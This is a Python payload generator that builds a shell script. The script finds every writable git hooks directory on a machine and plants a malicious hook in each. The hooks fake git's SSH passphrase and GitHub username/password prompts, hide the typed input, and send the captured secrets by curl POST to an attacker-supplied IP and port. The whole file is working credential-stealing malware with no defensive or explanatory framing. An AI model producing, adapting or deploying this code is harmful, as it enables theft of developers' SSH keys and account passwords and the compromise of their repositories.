def generate(ip_listening, port_listening, payload_hook):
    payload = """
#!/bin/sh
cc_url="http://%s:%s"
hook="%s"

function drop_pre_push () {
  local dest_file="$(echo $1 | rev | cut -d '/' -f2- | rev)"
  echo '#!/bin/sh' > "$dest_file/$hook"
  echo 'url="$2"' >> "$dest_file/$hook"
  echo 'send(){ curl -silent -d "$1" -XPOST --output /dev/null "'"$cc_url"'/"; }' >> "$dest_file/$hook"
  echo 'ssh(){ stty -echo; printf "Enter passphrase for key '"'"'/home/$(whoami)/.ssh/id_rsa'"'"': "; read p; stty echo; printf "\\n"; send "$p"; }' >> "$dest_file/$hook"
  echo 'https(){ read -p "Username for '"'"'https://github.com'"'"': " e; stty -echo; printf "Password for '"'"'https://$e@github.com'"'"': "; read p; stty echo; printf "\\n"; send "$e-$p"; }' >> "$dest_file/$hook"
  echo 'exec < /dev/tty; if echo "$url" | grep -q "^https"; then https; else ssh; fi' >> "$dest_file/$hook"
  chmod +x "$dest_file/$hook"
}

function drop_generic () {
  local dest_file="$(echo $1 | rev | cut -d '/' -f2- | rev)"
  echo '#!/bin/sh' > "$dest_file/$hook"
  echo 'send(){ curl -silent -d "$1" -XPOST --output /dev/null "'"$cc_url"'/"; }' >> "$dest_file/$hook"
  echo 'ssh(){ stty -echo; printf "Enter passphrase for key '"'"'/home/$(whoami)/.ssh/id_rsa'"'"': "; read p; stty echo; printf "\\n"; send "$p"; }' >> "$dest_file/$hook"
  echo 'https(){ read -p "Username for '"'"'https://github.com'"'"': " e; stty -echo; printf "Password for '"'"'https://$e@github.com'"'"': "; read p; stty echo; printf "\\n"; send "$e-$p"; }' >> "$dest_file/$hook"
  echo 'exec < /dev/tty; url="git"; branch="$(git branch --contains HEAD 2>/dev/null | sed -n "s|^\* ||p")"' >> "$dest_file/$hook"
  echo 'if [ "x$branch" != "x" ]; then' >> "$dest_file/$hook"
  echo 'remote="$(git config -l | grep "branch.$branch.remote" | rev | cut -d "=" -f1 | rev)"' >> "$dest_file/$hook"
  echo 'url="$(git config -l | grep "remote.$remote.url" | rev | cut -d "=" -f1 | rev)"; fi' >> "$dest_file/$hook"
  echo 'if echo "$url" | grep -q "^https"; then https; else ssh; fi' >> "$dest_file/$hook"
  chmod +x "$dest_file/$hook"
}

function drop_payload () {
  local dir="$1"

  if [ "$hook" == "pre-push" ]; then
    drop_pre_push "$dir"
  else
    drop_generic "$dir"
  fi
}

for git_dir in $(find / -name pre-commit.sample -writable 2>/dev/null); do
  drop_payload "$git_dir"
done
"""
    return(payload % (ip_listening, port_listening, payload_hook))


